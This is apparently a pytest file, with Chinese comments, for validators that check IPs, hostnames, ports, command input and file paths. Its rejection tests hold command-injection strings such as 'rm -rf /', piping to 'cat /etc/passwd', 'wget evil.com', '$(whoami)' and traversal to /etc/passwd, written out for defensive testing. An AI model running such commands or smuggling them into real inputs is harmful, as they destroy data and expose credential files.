"""输入校验模块测试

测试：
1. IP 地址校验（合法/非法）
2. Hostname 校验
3. 端口校验
4. 命令注入检测
5. 文件路径校验
"""
import sys
sys.path.insert(0, ".")

import pytest
from keeper.validators import (
    validate_ip,
    validate_hostname,
    validate_host,
    validate_port,
    validate_command_input,
    validate_file_path,
    safe_validate_host,
)
from keeper.exceptions import ValidationError


class TestValidateIP:
    """IP 地址校验"""

    def test_valid_ipv4(self):
        assert validate_ip("192.168.1.1") == "192.168.1.1"

    def test_valid_ipv4_zeros(self):
        assert validate_ip("0.0.0.0") == "0.0.0.0"

    def test_valid_ipv4_max(self):
        assert validate_ip("255.255.255.255") == "255.255.255.255"

    def test_valid_ipv4_strip(self):
        assert validate_ip("  10.0.0.1  ") == "10.0.0.1"

    def test_invalid_ipv4_overflow(self):
        with pytest.raises(ValidationError):
            validate_ip("256.1.1.1")

    def test_invalid_ipv4_letters(self):
        with pytest.raises(ValidationError):
            validate_ip("192.168.1.abc")

    def test_invalid_ipv4_extra_octets(self):
        with pytest.raises(ValidationError):
            validate_ip("1.2.3.4.5")

    def test_empty_ip(self):
        with pytest.raises(ValidationError):
            validate_ip("")

    def test_injection_in_ip(self):
        with pytest.raises(ValidationError):
            validate_ip("192.168.1.1; rm -rf /")


class TestValidateHostname:
    """Hostname 校验"""

    def test_valid_hostname(self):
        assert validate_hostname("web-server-01") == "web-server-01"

    def test_valid_fqdn(self):
        assert validate_hostname("app.example.com") == "app.example.com"

    def test_localhost(self):
        assert validate_hostname("localhost") == "localhost"

    def test_invalid_semicolon(self):
        with pytest.raises(ValidationError):
            validate_hostname("host;evil")

    def test_invalid_space(self):
        with pytest.raises(ValidationError):
            validate_hostname("host name")

    def test_invalid_pipe(self):
        with pytest.raises(ValidationError):
            validate_hostname("host|cmd")

    def test_empty(self):
        with pytest.raises(ValidationError):
            validate_hostname("")


class TestValidateHost:
    """Host（IP 或 hostname）校验"""

    def test_ip(self):
        assert validate_host("10.0.0.1") == "10.0.0.1"

    def test_hostname(self):
        assert validate_host("my-server") == "my-server"

    def test_localhost(self):
        assert validate_host("localhost") == "localhost"

    def test_invalid(self):
        with pytest.raises(ValidationError):
            validate_host("; rm -rf /")


class TestValidatePort:
    """端口校验"""

    def test_valid_port(self):
        assert validate_port(80) == 80

    def test_valid_port_string(self):
        assert validate_port("443") == 443

    def test_min_port(self):
        assert validate_port(1) == 1

    def test_max_port(self):
        assert validate_port(65535) == 65535

    def test_zero_port(self):
        with pytest.raises(ValidationError):
            validate_port(0)

    def test_overflow_port(self):
        with pytest.raises(ValidationError):
            validate_port(65536)

    def test_negative_port(self):
        with pytest.raises(ValidationError):
            validate_port(-1)

    def test_non_numeric(self):
        with pytest.raises(ValidationError):
            validate_port("abc")


class TestValidateCommandInput:
    """命令注入检测"""

    def test_safe_input(self):
        assert validate_command_input("192.168.1.100") == "192.168.1.100"

    def test_safe_hostname(self):
        assert validate_command_input("web-server-01") == "web-server-01"

    def test_injection_semicolon(self):
        with pytest.raises(ValidationError):
            validate_command_input("192.168.1.1; rm -rf /")

    def test_injection_pipe(self):
        with pytest.raises(ValidationError):
            validate_command_input("host | cat /etc/passwd")

    def test_injection_ampersand(self):
        with pytest.raises(ValidationError):
            validate_command_input("host & wget evil.com")

    def test_injection_dollar_paren(self):
        with pytest.raises(ValidationError):
            validate_command_input("$(whoami)")

    def test_injection_backtick(self):
        with pytest.raises(ValidationError):
            validate_command_input("`id`")

    def test_injection_redirect(self):
        with pytest.raises(ValidationError):
            validate_command_input("> /etc/shadow")

    def test_injection_path_traversal(self):
        with pytest.raises(ValidationError):
            validate_command_input("../../etc/passwd")

    def test_empty_input_ok(self):
        assert validate_command_input("") == ""


class TestValidateFilePath:
    """文件路径校验"""

    def test_valid_path(self):
        assert validate_file_path("/var/log/syslog") == "/var/log/syslog"

    def test_traversal_blocked(self):
        with pytest.raises(ValidationError):
            validate_file_path("/var/log/../../etc/passwd")

    def test_injection_in_path(self):
        with pytest.raises(ValidationError):
            validate_file_path("/var/log; rm -rf /")

    def test_empty_path(self):
        with pytest.raises(ValidationError):
            validate_file_path("")


class TestSafeValidateHost:
    """safe_validate_host（不抛异常版本）"""

    def test_valid_returns_true(self):
        ok, result = safe_validate_host("192.168.1.1")
        assert ok is True
        assert result == "192.168.1.1"

    def test_invalid_returns_false(self):
        ok, result = safe_validate_host("; evil")
        assert ok is False
        assert "不合法" in result or "不安全" in result or "格式" in result


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
